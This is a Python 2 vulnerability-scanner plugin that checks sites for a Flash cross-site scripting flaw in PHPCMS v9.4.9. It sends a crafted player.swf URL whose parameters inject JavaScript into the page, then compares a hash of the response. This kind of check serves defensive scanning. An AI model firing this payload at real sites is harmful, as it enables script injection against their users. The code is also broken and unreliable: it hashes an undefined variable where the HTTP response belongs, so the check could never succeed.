# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re,urllib,md5

class Vuln(ABVuln):
    poc_id = 'd2e002bf-bf2b-4a73-b0dd-4c7760c8b07d'
    name = 'PHPCMS v9.4.9 flash xss漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = 'Unkonwn'  # 漏洞公布时间
    desc = '''
        PHPCMS v9.4.9 flash xss漏洞。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'PHPCMS'  # 漏洞应用名称
    product_version = 'v9.4.9'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '0444fa97-557e-4e4e-9561-e815c2296182'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
                    
            md5_check_value = 'cf00b069e36e756705c49b3a3bf20c40'
            payload = urllib.unquote("/statics/js/ckeditor/plugins/flashplayer/player/player.swf?skin=skin.swf%26stream%3D%5C%2522%29%29%7Dcatch%28e%29%7Balert%281%29%7D%2f%2f")
            #code, head, res, errcode, _ = curl.curl(url+payload)
            #print(payload)
            r = requests.get(self.target + payload)
            if r.status_code == 200:
                md5_buff = md5.new(res).hexdigest()
                if md5_buff in md5_check_value:
                    #security_info(url + 'phpcms v9.4.9 flash xss')
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
